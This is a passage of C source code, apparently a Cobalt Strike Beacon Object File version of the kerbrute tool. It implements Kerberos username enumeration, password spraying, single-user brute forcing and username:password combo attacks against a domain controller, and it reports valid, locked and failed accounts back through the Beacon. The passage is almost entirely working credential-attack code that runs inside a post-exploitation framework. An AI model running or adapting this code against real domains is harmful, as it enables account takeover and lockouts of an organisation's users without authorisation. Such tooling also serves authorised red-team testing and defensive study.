        ctx->locked++;
        BeaconPrintf(CALLBACK_OUTPUT,"[!] LOCKED/DISABLED: %s@%s\n", username, ctx->domain);
        if (ctx->safe) {
            BeaconPrintf(CALLBACK_OUTPUT,"[!] Safe mode — aborting all further attempts.\n");
            ctx->aborted=1;
        }
        break;
    case 3:
        if (ctx->verbose)
            BeaconPrintf(CALLBACK_OUTPUT,"[-] WRONG PASSWORD: %s@%s\n", username, ctx->domain);
        break;
    case -7:
        /* Unknown KRB error — already printed by test_user with the raw code.
         * Count separately so it doesn't inflate the network error bucket.  */
        ctx->errors++;
        break;
    default:
        /* Negative stage code from krb_transact (-1 through -6) */
        ctx->errors++;
        {
            static const char *stages[] = {
                "ok","-1:resolve","-2:socket","-3:connect/port88",
                "-4:recv_timeout","-5:bad_resplen","-6:body_recv"
            };
            int si = (result >= -6 && result <= -1) ? -result : 0;
            BeaconPrintf(CALLBACK_ERROR,"[!] NETWORK ERROR %s: %s@%s\n",
                stages[si], username, ctx->domain);
        }
        break;
    }

    if (ctx->delay>0) Sleep((DWORD)ctx->delay);

    return ctx->aborted;
}

/* ── Line-iterator callback typedef ─────────────────────────────────────── */
typedef void (*line_cb)(const char *, void *);

static void for_each_line(char *buf, line_cb fn, void *ctx_ptr) {
    char *p=buf;
    while (*p) {
        char *end=p;
        while (*end&&*end!='\n') end++;
        char save=*end; *end=0;
        char *line=trim(p);
        if (Strlen(line)>0) fn(line, ctx_ptr);
        *end=save;
        p=(*end) ? end+1 : end;
    }
}

/* ── Mode callbacks ───────────────────────────────────────────────────────── */

/* userenum: no pre-auth */
static void cb_userenum(const char *user, void *vctx) {
    krb_ctx *ctx=(krb_ctx*)vctx;
    if (ctx->aborted) return;
    int r=test_user(ctx, user, NULL);
    handle_result(ctx, r, user, NULL, 1);
}

/* passwordspray: fixed password, iterate users */
static void cb_spray(const char *user, void *vctx) {
    krb_ctx *ctx=(krb_ctx*)vctx;
    if (ctx->aborted) return;
    BYTE nthash[16]; nt_hash(ctx->password, nthash);
    int r=test_user(ctx, user, nthash);
    handle_result(ctx, r, user, ctx->password, 0);
}

/* bruteuser: fixed username, iterate passwords */
static void cb_bruteuser(const char *pw, void *vctx) {
    krb_ctx *ctx=(krb_ctx*)vctx;
    if (ctx->aborted||ctx->done) return;
    BYTE nthash[16]; nt_hash(pw, nthash);
    int r=test_user(ctx, ctx->username, nthash);
    int stop=handle_result(ctx, r, ctx->username, pw, 0);
    /* stop after the first valid hit */
    if (r==1||stop) ctx->done=1;
}

/* bruteforce: combo file "username:password" */
static void cb_bruteforce(const char *combo, void *vctx) {
    krb_ctx *ctx=(krb_ctx*)vctx;
    if (ctx->aborted) return;
    char buf[512]; Memset(buf,0,512);
    int clen=Strlen(combo);
    if (clen>=512) return;
    Memcpy(buf,combo,clen);
    char *colon=buf;
    while (*colon&&*colon!=':') colon++;
    if (!*colon) return;
    *colon=0;
    char *user=trim(buf);
    char *pw=trim(colon+1);
    if (!Strlen(user)||!Strlen(pw)) return;
    BYTE nthash[16]; nt_hash(pw, nthash);
    int r=test_user(ctx, user, nthash);
    handle_result(ctx, r, user, pw, 0);
}

/* ── BOF entry point ─────────────────────────────────────────────────────── */
void go(char *buffer, int length) {
    datap args;
    BeaconDataParse(&args, buffer, length);
    char *b64    = BeaconDataExtract(&args, NULL);
    char *domain = BeaconDataExtract(&args, NULL);
    char *dc_arg = BeaconDataExtract(&args, NULL);
    char *single = BeaconDataExtract(&args, NULL);
    int   mode   = BeaconDataInt(&args);
    int   delay  = BeaconDataInt(&args);
    int   flags  = BeaconDataInt(&args);

    if (!b64||!domain||Strlen(domain)==0) {
        BeaconPrintf(CALLBACK_ERROR,"[kerbrute] Missing required arguments.\n"); return; }

    int b64len=Strlen(b64), decmax=(b64len/4)*3+4;
    char *decoded=(char*)Malloc(decmax+1);
    b64_decode(b64,(BYTE*)decoded,decmax);

    krb_ctx ctx; Memset(&ctx,0,sizeof(ctx));
    ctx.dc        = (dc_arg&&Strlen(dc_arg)>0) ? dc_arg : domain;
    ctx.domain    = domain;
    ctx.password  = single;
    ctx.username  = single;
    ctx.delay     = delay;
    ctx.downgrade = (flags&FLAG_DOWNGRADE)!=0;
    ctx.safe      = (flags&FLAG_SAFE)!=0;
    ctx.verbose   = (flags&FLAG_VERBOSE)!=0;

    static const char *mnames[]={"userenum","passwordspray","bruteuser","bruteforce"};
    BeaconPrintf(CALLBACK_OUTPUT,
        "[kerbrute] mode=%s  domain=%s  dc=%s  delay=%dms  downgrade=%s  safe=%s  verbose=%s\n",
        (mode>=0&&mode<=3)?mnames[mode]:"?", domain, ctx.dc,
        delay,
        ctx.downgrade?"yes":"no",
        ctx.safe     ?"yes":"no",
        ctx.verbose  ?"yes":"no");

    switch (mode) {
    case MODE_USERENUM:
        for_each_line(decoded, cb_userenum, &ctx);
        break;
    case MODE_SPRAY:
        if (!single||Strlen(single)==0) {
            BeaconPrintf(CALLBACK_ERROR,"[kerbrute] -p <password> required for passwordspray.\n"); break; }
        BeaconPrintf(CALLBACK_OUTPUT,"[kerbrute] Spraying: %s\n", single);
        for_each_line(decoded, cb_spray, &ctx);
        break;
    case MODE_BRUTEUSER:
        if (!single||Strlen(single)==0) {
            BeaconPrintf(CALLBACK_ERROR,"[kerbrute] -u <username> required for bruteuser.\n"); break; }
        BeaconPrintf(CALLBACK_OUTPUT,"[kerbrute] Target: %s@%s\n", single, domain);
        for_each_line(decoded, cb_bruteuser, &ctx);
        break;
    case MODE_BRUTEFORCE:
        for_each_line(decoded, cb_bruteforce, &ctx);
        break;
    default:
        BeaconPrintf(CALLBACK_ERROR,"[kerbrute] Unknown mode: %d\n", mode); break;
    }

    if (ctx.aborted)
        BeaconPrintf(CALLBACK_OUTPUT,"[kerbrute] Aborted (safe mode).\n");

    BeaconPrintf(CALLBACK_OUTPUT,
        "[kerbrute] Done — valid: %d  not-found: %d  locked: %d  errors: %d\n",
        ctx.valid, ctx.notfound, ctx.locked, ctx.errors);

    Free(decoded);
}
